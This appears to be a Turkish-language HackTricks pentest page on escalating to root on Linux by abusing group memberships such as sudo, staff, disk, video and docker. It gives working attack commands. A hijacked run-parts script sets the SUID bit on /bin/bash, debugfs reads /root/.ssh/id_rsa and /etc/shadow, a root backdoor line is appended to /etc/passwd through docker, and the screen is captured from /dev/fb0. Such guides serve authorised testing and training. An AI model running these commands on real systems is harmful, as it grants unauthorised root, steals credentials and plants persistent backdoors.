# Interesting Groups - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Sudo/Admin Groups

### **PE - Method 1**

**Bazen**, bir sistemin **/etc/sudoers** policy'si (veya bu policy tarafından dahil edilen bir dosya) aşağıdakilere benzer girdiler içerir:<sup>[[3]](#references)</sup>
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Bu, girişlerden herhangi biriyle eşleşen herhangi bir kullanıcının `sudo` aracılığıyla herhangi bir hedef kullanıcı olarak herhangi bir komutu çalıştırabileceği anlamına gelir (politikanın geri kalanına tabi olarak).<sup>[[3]](#references)</sup>

Durum buysa, **root olmak için şunu çalıştırmanız yeterlidir**:
```
sudo su
```
### PE - Method 2

Tüm suid binary'lerini bulun ve **Pkexec** binary'sinin olup olmadığını kontrol edin:
```bash
find / -perm -4000 2>/dev/null
```
**pkexec bir SUID binary** ise, yalnızca polkit istenen işlemi yetkilendirdiğinde başka bir kullanıcı olarak program çalıştırabilir; SUID biti tek başına root yetkisini garanti etmez. **sudo** veya **admin** üyeliğinin yeterli olduğunu varsaymak yerine, yüklü policy'yi ve hedef session'ın authorization durumunu kontrol edin.<sup>[[4]](#references)[[5]](#references)</sup>

Hâlâ eski Local Authority backend'ini kullanan distribution'larda group kurallarını şu komutla inceleyin:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
İlgili grup adları ve varsayılanlar dağıtıma göre değişir; bir grup yalnızca yerel politika onu adlandırıyorsa burada kullanışlıdır.<sup>[[5]](#references)</sup>

**root olmak için şunu çalıştırabilirsiniz**:
```bash
pkexec "/bin/sh" #Authentication is required according to the local policy
```
**pkexec** çalıştırmayı denerseniz ve şu **hatayı** alırsanız:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
Kayıtlı bir authentication agent bulunmayan bir SSH oturumunda, politika normalde bu eyleme izin verse bile `pkexec` şu hatayla başarısız olabilir; polkit, masaüstü dışı oturumlar için `pkttyagent`'ı metin tabanlı bir authentication agent olarak belgeler. Kesin davranış sürüme ve dağıtıma bağlıdır; bu nedenle yerel politikayı ve agent kurulumunu doğrulayın. Etkilenen NixOS sürümleri için bildirilen bir workaround, **2 farklı SSH oturumu** kullanır.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Wheel Grubu

Bazen bir sudoers policy şu girdiyi de içerebilir:
```
%wheel	ALL=(ALL:ALL) ALL
```
Bu, girdide eşleşen herhangi bir kullanıcının `sudo` aracılığıyla herhangi bir hedef kullanıcı olarak herhangi bir komutu çalıştırabileceği anlamına gelir (politikanın geri kalanına tabidir).<sup>[[3]](#references)</sup>

Durum buysa, **root olmak için yalnızca şunu çalıştırabilirsiniz**:
```
sudo su
```
## Shadow Group

İzinlerin bu erişimi verdiği sistemlerde, **shadow** grubundaki kullanıcılar **/etc/shadow** dosyasını **okuyabilir**; hedef üzerindeki gerçek izin modunu ve ACL'leri doğrulayın:<sup>[[6]](#references)[[7]](#references)</sup>
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Bu nedenle dosyayı okuyun ve bazı **hash'leri crack etmeyi** deneyin.

Hash'leri değerlendirirken hızlı kilit durumu ayrıntısı:
- `!` veya `*` içeren girdiler genellikle parola girişleri için etkileşimli değildir.
- `!hash`, parolanın kilitlendiği anlamına gelir; kalan karakterler, kilitlenmeden önceki parola alanını temsil eder.
- `*` içeren bir alan geçerli bir `crypt(3)` hash'i değildir ve UNIX-parola girişini engeller; parolanın daha önce ayarlanıp ayarlanmadığı bu alandan çıkarılmamalıdır.
Bu, doğrudan giriş engellenmiş olsa bile hesap sınıflandırması için kullanışlıdır.<sup>[[6]](#references)</sup>

## Staff Grubu

**staff**: Kullanıcıların root ayrıcalıklarına ihtiyaç duymadan sistemde (`/usr/local`) yerel değişiklikler yapmasına olanak tanır (`/usr/local/bin` içindeki executable'ların herhangi bir kullanıcının `PATH` değişkeninde bulunduğunu ve aynı ada sahip `/bin` ile `/usr/bin` içindeki executable'ları "override" edebileceklerini unutmayın). İzleme/güvenlikle daha ilgili olan "adm" grubuyla karşılaştırın.<sup>[[2]](#references)[[7]](#references)</sup>

`PATH` içinde `/usr/local/bin`'in `/usr/bin`'den önce yer aldığı Debian yapılandırmalarında (aşağıdaki örneklerde olduğu gibi), nitelendirilmemiş bir komut önce `/usr/local/bin` kopyasına çözümlenir; hedefteki etkin `PATH` değerini doğrulayın.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
Ayrıcalıklı bir process, nitelendirilmemiş bir komutu yazılabilir `/usr/local/bin` üzerinden çözümlerse, bu komutu değiştirmek process'in ayrıcalıklarıyla çalıştırılmasını sağlayabilir; test etmeden önce gerçek yolu ve tetikleyiciyi doğrulayın.

Ubuntu sistemlerinde `pam_motd`, oturum açma sırasında root olarak `run-parts --lsbsysinit` aracılığıyla çalıştırılabilir script'leri yürütür; cron job'ları da `run-parts` kullanabilir, ancak bu durum dağıtıma ve yapılandırmaya özgüdür.<sup>[[10]](#references)[[11]](#references)</sup>
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
Yeni bir SSH girişinde `pspy`, bu yolun hedefte gerçekten çağrılıp çağrılmadığını doğrulamaya yardımcı olabilir; root olmadan işlem komut satırlarını gözlemleyebilir.<sup>[[10]](#references)[[12]](#references)</sup>
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Exploit**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Disk Grubu

**disk** grubuna üyelik, block cihazlarına raw erişim sağlayabilir ve çoğu zaman **root erişimine yakındır**; Debian bunu büyük ölçüde root erişimine eşdeğer olarak tanımlar, ancak hedefteki gerçek cihaz izinlerini ve storage düzenini doğrulayın.<sup>[[7]](#references)</sup>

Yaygın cihaz yolları arasında `/dev/sd*` bulunur, ancak NVMe ve diğer storage düzenleri farklı adlar kullanır.
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
`debugfs`, ext2/ext3/ext4 dosya sistemleri üzerinde çalışır; yukarıdaki `/root` ve `/etc/shadow` gibi yollar, açılan dosya sistemi içindeki dosyalardır; `dump` komutunun ikinci argümanı ise yerel dosya sistemindeki bir çıktı yoludur.<sup>[[8]](#references)</sup> Örneğin bu, açılan dosya sistemindeki `/tmp/asd1.txt` dosyasını yerel dosya sistemindeki `/tmp/asd2.txt` konumuna çıkarır:
```bash
debugfs /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
`-w` seçeneği dosya sistemini read-write olarak açar ve `write` komutu yerel bir dosyayı açılan dosya sistemine kopyalar. Doğrudan yapılan düzenlemeler dosya sistemini bozabileceğinden, bunu bağlı ve aktif bir dosya sistemi üzerinde kullanmaktan kaçının; mümkün olduğunda offline bir image üzerinden çalışın.<sup>[[8]](#references)</sup>
```bash
debugfs -w /dev/sda1
debugfs:  write /tmp/asd1.txt /tmp/asd2.txt
```
## Video Grubu

`w` komutunu kullanarak **sistemde kimin oturum açtığını** bulabilir ve aşağıdakine benzer bir çıktı görebilirsiniz.<sup>[[20]](#references)</sup>
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1** girdisi, ilk Linux sanal konsolunu tanımlar; özellikle container'larda veya diğer ortamlarda, tek başına makinenin başında fiziksel olarak bir kullanıcı bulunduğunu kanıtlamaz.<sup>[[21]](#references)</sup>

Okunabilir bir framebuffer device sunan sistemlerde, **video** grubuna üyelik bu device'a erişim sağlayabilir. Linux framebuffer interface, ekran görüntüsü almak üzere kopyalanabilen okunabilir bir memory device olarak `/dev/fb0` yolunu belgeler; `/sys/class/graphics/fb0/virtual_size` yolu yalnızca ilgili fbdev sysfs attribute'unun mevcut olduğu durumlarda kullanılabilir, bu nedenle önce hedefi kontrol edin.<sup>[[7]](#references)[[9]](#references)</sup>
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Yüklü **GIMP** sürümü raw-data importer özelliği sunuyorsa **`screen.raw`** dosyasını bu importer ile açın; destek ve kontroller sürüme ve plug-in'e göre değişir.<sup>[[22]](#references)</sup>

![Disk Group - Video Group: Raw image'ı açmak için GIMP kullanabilir, screen.raw dosyasını seçebilir ve dosya türü olarak Raw image data'yı belirleyebilirsiniz](<../../../images/image (463).png>)

Image Width ve Height değerlerini framebuffer geometrisiyle eşleşecek şekilde ayarlayın; çıktı okunabilir olana kadar mevcut pixel format/Image Type seçeneklerini deneyin.<sup>[[9]](#references)</sup>

![Disk Group - Video Group: Ardından Width ve Height değerlerini ekranda kullanılan değerlerle değiştirin ve farklı Image Type seçeneklerini deneyin (ekranı en iyi göstereni seçin)](<../../../images/image (317).png>)

## Root Grubu

**root** grubuna üyelik root'un UID'sini sağlamaz; ancak `root` sahipliğindeki, grup tarafından yazılabilir dosyalar, privileged servisler veya library'ler bunları kullandığında yine de ilgi çekici olabilir. Dosyayı bir privilege-escalation yolu olarak değerlendirmeden önce gerçek izinlerini ve nasıl kullanıldığını doğrulayın.

**root üyelerinin değiştirebildiği dosyaları kontrol edin**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker Grubu

`docker` grubuna üyelik, standart rootful kurulumlarda root düzeyinde Docker daemon erişimi sağlar. Bind mount'lar varsayılan olarak read-write olduğundan, bu daemon'u kontrol edebilen bir kullanıcı host'un `/` dizinini bir container'a mount edebilir ve host dosyalarını değiştirebilir; bu, host üzerinde fiilen root yetkisi sağlar.<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bash
```
Son olarak, önceki önerilerden hiçbirini beğenmezseniz veya herhangi bir nedenle çalışmıyorlarsa (docker api firewall?), burada açıklandığı şekilde her zaman **privileged bir container çalıştırıp container'dan escape etmeyi** deneyebilirsiniz:

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

Docker socket üzerinde yazma izinleriniz varsa [**docker socket'i abuse ederek nasıl privilege escalation yapılacağını anlatan bu yazıyı**](../../1-linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)** okuyun.**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd Group

{{#ref}}
./
{{#endref}}

## Adm Group

Genellikle **`adm`** grubunun **üyeleri**, _/var/log/_ içinde bulunan **log** dosyalarını **okuma** izinlerine sahiptir.\
Bu nedenle, bu grubun içindeki bir user'ı compromise ettiyseniz kesinlikle **log'lara göz atmalısınız**.<sup>[[7]](#references)</sup>

## Backup / Operator / lp / Mail groups

Bu grupların service- ve distribution-specific anlamları vardır. Debian, delegated backup/restore işlemleri için `backup`, printer daemon'ları için `lp` ve `/var/mail` için `mail` grubunu belgeler; bu nedenle membership'i bir privilege path olarak değerlendirmeden önce yerel izinleri kontrol edin.<sup>[[7]](#references)</sup>

Bunlar genellikle doğrudan root vector'leri olmaktan ziyade **credential-discovery** vector'leridir:
- **backup**: config'leri, key'leri, DB dump'larını veya token'ları içeren archive'ları açığa çıkarabilir.
- **operator**: sensitive runtime data leak edebilen, platform-specific operational access sağlar.
- **lp**: print queue/spool'ları document içerikleri barındırabilir.
- **mail**: mail spool'ları reset link'lerini, OTP'leri ve internal credential'ları açığa çıkarabilir.

Buradaki membership'i high-value bir data exposure bulgusu olarak değerlendirin ve password/token reuse üzerinden pivot edin.

## Auth group

OpenBSD'de S/Key yapılandırıldığında `/etc/skey`, `root:auth` tarafından sahiplenilir ve kayıtlarına erişim için `auth` grubu gerekir; YubiKey kayıtları `/var/db/yubikey` içinde tutulur.<sup>[[16]](#references)[[17]](#references)</sup> S/Key veya YubiKey'in etkin olduğu vulnerable bir OpenBSD 6.6 configuration'ı, `auth` privilege'larına sahip local user'ların root olmasına izin veriyordu; Qualys prerequisite'ı ve exploit chain'i belgeler, bağlantısı verilen PoC ise bunu implement eder.<sup>[[18]](#references)[[19]](#references)</sup>

## References

- [1] [pkexec/pkttyagent authentication without a GUI session (NixOS issue #18012)](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
- [2] [SystemGroups - Debian Wiki](https://wiki.debian.org/SystemGroups)
- [3] [sudoers(5) — sudo — Debian Manpages](https://manpages.debian.org/bookworm/sudo/sudoers.5.en.html)
- [4] [pkexec — polkit Reference Manual](https://polkit.pages.freedesktop.org/polkit/pkexec.1.html)
- [5] [polkit — polkit Reference Manual](https://polkit.pages.freedesktop.org/polkit/polkit.8.html)
- [6] [shadow(5) — Linux manual page](https://man7.org/linux/man-pages/man5/shadow.5.html)
- [7] [Securing Debian Manual](https://www.debian.org/doc/manuals/securing-debian-manual/securing-debian-manual.en.pdf)
- [8] [debugfs(8) — Linux manual page](https://www.man7.org/linux/man-pages/man8/debugfs.8.html)
- [9] [The Frame Buffer Device — The Linux Kernel documentation](https://docs.kernel.org/fb/framebuffer.html)
- [10] [update-motd(5) — Ubuntu Manpages](https://manpages.ubuntu.com/manpages/resolute/man5/update-motd.5.html)
- [11] [run-parts(8) — Debian Manpages](https://manpages.debian.org/unstable/debianutils/run-parts.8.en.html)
- [12] [pspy — unprivileged Linux process snooping](https://github.com/DominicBreuker/pspy)
- [13] [Docker Engine security](https://docs.docker.com/engine/security/)
- [14] [Manage Docker as a non-root user](https://docs.docker.com/engine/install/linux-postinstall)
- [15] [Running containers — Docker Docs](https://docs.docker.com/engine/containers/run/)
- [16] [skey(5) — OpenBSD manual pages](https://man.openbsd.org/skey.5)
- [17] [login_yubikey(8) — OpenBSD manual pages](https://man.openbsd.org/login_yubikey.8)
- [18] [Authentication vulnerabilities in OpenBSD — Qualys Security Advisory](https://www.openwall.com/lists/oss-security/2019/12/04/5)
- [19] [openbsd-authroot — local exploit PoC](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
- [20] [w(1) — Linux manual page](https://man7.org/linux/man-pages/man1/w.1.html)
- [21] [Linux allocated devices (4.x+ version)](https://docs.kernel.org/6.16/admin-guide/devices.html)
- [22] [Image Import and Export — GIMP Documentation](https://docs.gimp.org/3.0/en/gimp-prefs-import-export.html)
{{#include ../../../banners/hacktricks-training.md}}
